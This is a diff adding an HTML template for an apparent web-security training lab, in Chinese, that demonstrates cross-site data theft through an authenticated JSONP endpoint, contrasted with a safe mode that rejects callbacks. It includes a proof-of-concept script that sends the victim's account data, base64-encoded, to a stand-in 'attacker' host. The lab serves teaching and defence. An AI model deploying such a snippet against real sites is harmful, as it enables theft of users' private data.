@@ -1,0 +1,30 @@
+{% extends 'base.html' %}
+{% block title %}{{ lab.title }}{% endblock %}
+{% block content %}
+{% include 'shared_lab_header.html' %}
+<div class="workbench two-col wide-layout">
+  <section class="console-card">
+    <h2>带身份 JSONP / CSRF Token 防不住的"读"</h2>
+    <pre class="code-panel">vuln：/api/jsonp/account?callback=fn 会带着 Cookie 返回敏感字段（email/balance/private_note）
+   并用 fn(...) 包装。第三方页面只需一个 &lt;script src&gt; 就能拿到。
+safe：检测到 ?callback= 即直接 400 拒绝，强制 application/json。
+
+PoC（直接点击对比响应类型与 body）：
+  vuln：<a href="/api/jsonp/account?callback=leak&mode=vuln" target="_blank">/api/jsonp/account?callback=leak&mode=vuln</a>
+  safe：<a href="/api/jsonp/account?callback=leak&mode=safe" target="_blank">/api/jsonp/account?callback=leak&mode=safe</a>
+
+第三方页面 PoC：
+  &lt;script&gt;
+    function leak(d) { fetch('//attacker/' + btoa(JSON.stringify(d))); }
+  &lt;/script&gt;
+  &lt;script src="http://localhost:5070/api/jsonp/account?callback=leak"&gt;&lt;/script&gt;</pre>
+    <h3>安全性对比</h3>
+    <ul class="muted">
+      <li>CSRF Token 只能阻止 <strong>写</strong> 操作的伪造请求；JSONP 是 <strong>读</strong> 通道，CSRF Token 完全不参与。</li>
+      <li>SameSite=Strict / Lax 能缓解一部分，但若服务端响应直接是可执行 JS，攻击者仍可以诱导用户点击带 Cookie 的链接。</li>
+      <li>真正的修法：所有带身份的接口必须返回 application/json 且禁用 callback。</li>
+    </ul>
+  </section>
+</div>
+{% include 'shared_hints.html' %}
+{% endblock %}
